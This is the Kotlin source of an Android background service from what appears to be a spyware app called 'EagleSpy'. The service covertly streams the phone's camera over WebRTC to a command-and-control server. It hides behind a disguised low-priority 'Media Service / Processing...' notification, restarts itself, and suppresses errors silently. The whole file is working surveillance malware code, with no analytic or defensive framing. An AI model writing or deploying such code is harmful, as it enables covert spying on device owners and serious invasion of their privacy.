package com.stealth.eaglespy.services

import android.Manifest
import android.app.*
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.content.pm.ServiceInfo
import android.os.Build
import android.os.IBinder
import androidx.core.app.ActivityCompat
import androidx.core.app.NotificationCompat
import com.stealth.eaglespy.EagleSpyApp
import com.stealth.eaglespy.webrtc.PeerConnectionClient
import com.stealth.eaglespy.webrtc.SignalingClient

/**
 * Background Camera Streaming Service
 * Captures video via WebRTC and streams to C2
 */
class CameraService : Service() {

    companion object {
        private const val NOTIFICATION_ID = 2002
        private const val CHANNEL_ID = "camera_channel"
    }

    private var peerConnectionClient: PeerConnectionClient? = null
    private var signalingClient: SignalingClient? = null
    private var isStreaming = false
    private var useFrontCamera = true

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onCreate() {
        super.onCreate()
        createNotificationChannel()
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        val action = intent?.action
        useFrontCamera = intent?.getBooleanExtra("front_camera", true) ?: true

        when (action) {
            "START_STREAM" -> startCameraStream()
            "STOP_STREAM" -> stopCameraStream()
            "SWITCH_CAMERA" -> switchCamera()
        }

        return START_STICKY
    }

    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(
                CHANNEL_ID,
                "Camera Service",
                NotificationManager.IMPORTANCE_LOW
            ).apply {
                description = "Video processing"
                setShowBadge(false)
            }

            val manager = getSystemService(NotificationManager::class.java)
            manager.createNotificationChannel(channel)
        }
    }

    private fun createStealthNotification(): Notification {
        return NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle("Media Service")
            .setContentText("Processing...")
            .setSmallIcon(android.R.drawable.ic_menu_camera)
            .setPriority(NotificationCompat.PRIORITY_LOW)
            .setOngoing(true)
            .build()
    }

    private fun startCameraStream() {
        if (isStreaming) return
        
        if (ActivityCompat.checkSelfPermission(this, Manifest.permission.CAMERA) 
            != PackageManager.PERMISSION_GRANTED) {
            return
        }

        // Start foreground
        val notification = createStealthNotification()
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
            startForeground(NOTIFICATION_ID, notification, ServiceInfo.FOREGROUND_SERVICE_TYPE_CAMERA)
        } else {
            startForeground(NOTIFICATION_ID, notification)
        }

        // Initialize signaling client
        signalingClient = SignalingClient(
            EagleSpyApp.serverUrl,
            EagleSpyApp.deviceId,
            "camera"
        )
        
        signalingClient?.setListener(object : SignalingClient.Listener {
            override fun onConnected() {
                initializePeerConnection()
            }

            override fun onOffer(sdp: String) {
                peerConnectionClient?.setRemoteDescription(sdp, "offer")
                peerConnectionClient?.createAnswer()
            }

            override fun onAnswer(sdp: String) {
                peerConnectionClient?.setRemoteDescription(sdp, "answer")
            }

            override fun onIceCandidate(candidate: String, sdpMid: String, sdpMLineIndex: Int) {
                peerConnectionClient?.addIceCandidate(candidate, sdpMid, sdpMLineIndex)
            }

            override fun onDisconnected() {
                stopCameraStream()
            }

            override fun onError(message: String) {
                // Log error silently
            }
        })

        signalingClient?.connect()
        isStreaming = true
    }

    private fun initializePeerConnection() {
        peerConnectionClient = PeerConnectionClient(
            applicationContext,
            useFrontCamera,
            true, // video enabled
            false // audio disabled for camera service
        )

        peerConnectionClient?.setListener(object : PeerConnectionClient.Listener {
            override fun onIceCandidate(candidate: String, sdpMid: String, sdpMLineIndex: Int) {
                signalingClient?.sendIceCandidate(candidate, sdpMid, sdpMLineIndex)
            }

            override fun onLocalDescription(sdp: String, type: String) {
                if (type == "answer") {
                    signalingClient?.sendAnswer(sdp)
                } else {
                    signalingClient?.sendOffer(sdp)
                }
            }

            override fun onConnected() {
                // Stream established
            }

            override fun onDisconnected() {
                stopCameraStream()
            }
        })

        peerConnectionClient?.initialize()
        // Wait for offer from server
    }

    private fun stopCameraStream() {
        peerConnectionClient?.close()
        peerConnectionClient = null
        signalingClient?.disconnect()
        signalingClient = null
        isStreaming = false
        stopForeground(STOP_FOREGROUND_REMOVE)
    }

    private fun switchCamera() {
        useFrontCamera = !useFrontCamera
        peerConnectionClient?.switchCamera()
    }

    override fun onDestroy() {
        stopCameraStream()
        super.onDestroy()
    }
}
